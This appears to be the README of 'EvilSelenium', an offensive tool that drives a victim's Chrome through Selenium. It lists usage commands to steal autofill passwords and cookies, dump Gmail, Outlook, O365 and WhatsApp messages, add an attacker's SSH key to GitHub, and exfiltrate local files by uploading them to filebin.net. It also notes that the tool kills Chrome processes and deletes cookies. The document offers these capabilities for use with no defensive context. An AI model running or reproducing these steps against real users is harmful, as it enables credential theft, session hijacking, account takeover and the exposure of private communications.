# EvilSelenium
EvilSelenium is a beta project that weaponizes <a href="https://www.selenium.dev/">Selenium</a> to abuse Chrome, specifically:

* Steal stored credentials (via autofill)
* Steal cookies
* Take screenshots of websites
* Dump Gmail/O365 emails
* Dump WhatsApp messages
* Download & exfiltrate files
* Add SSH keys to GitHub

Easily extend the existing functionality to suit your needs (e.g. Create resources on Azure, download files from GDrive/OneDrive).

# READ PLEASE

**Existing Chrome processes are terminated when this tool runs in order to be able to access the user's Chrome profile.**

# READ PLEASE #2

I built this tool in about a week & I didn't run as many tests as I should. I would highly advise running some tests first.

# Usage

    /help - Show this help menu.

    SETUP:
    /install - Install chromedriver & Selenium webdriver. Run this once.

    RECON:
    /enumsavedsites [out_path] - Check which websites have passwords saved via screenshot(s).
    /screenshot [website] [out_path] - Screenshot a given webpage.

    CREDENTIALS:
    /autorun - Extract saved credentials from common websites.
    /dynamicid [login_page] [username_id] [password_id] - Extract saved credentials from a website, providing the username field ID & password field ID.
    /dynamicname [login_page] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value & password name value.
    /dynamicname2 [login_page] [username_position] [password_position] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value, password name value and their positions.

    COOKIES:
    /cookies [website] - Grabs cookies for a given website.

    MODULES:
    /download [file_url] [seconds] - Downloads a file and specify time to wait for download to finish. File extensions should not be executable.
    /exfil [local_file] [seconds] - Uploads a file on filebin.net and outputs the download link.
    /gmail [out_path] [num_of_emails] - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.
    /outlook [out_path] [num_of_emails] - Fetches emails from Outlook if user is authenticated.
    /o365 [out_path] [num_of_emails] - Fetches emails from O365 Outlook if user is authenticated.
    /github [key] - Add your SSH key to Github if user is authenticated.
    /whatsapp [out_path] - Fetches Whatsapp messages if user is authenticated (BETA).

# Setup

The `/install` command will download the Chrome Driver and Selenium WebDriver which are the necessary requirements. EvilSelenium will work on Chrome versions 98-90.

**Tested on Windows 10, Chrome v97 & v90.**

	EvilSelenium.exe /install

# Recon Module

`/enumsavedsites` - This will take screenshots of chrome://settings/passwords

`/screenshot` - Screenshot any website. If the user is authenticated to the website then you get authenticated screenshots :).

# Credentials Module

**IMPORTANT:** The credentials module will **DELETE COOKIES** and steal credentials from autofill. Ideally, you should use the credentials module at the end otherwise you would have to write code to sign back in.

`/autorun` - I pre-built credential stealer templates for common websites. I'll continue to add more.

`dynamicid` - Provide the login URL along with the username input field's ID and password field's ID. This is equivalent to document.getElementById("password").value.

`dynamicname` - If the fields don't have IDs, provide the fields' name values. It will pick the first index of the name values. This is equivalent to document.getElementsByName("password")[0].value.

`dynamicname2` - Provide the fields' name values along with their index position. This is equivalent to document.getElementsByName("password")[x].value.

# Cookies Module

`/cookies` - Dumps cookies from the specified website.

# Misc Modules

These are additional modules I built to demonstrate what sort of actions you can do with Selenium.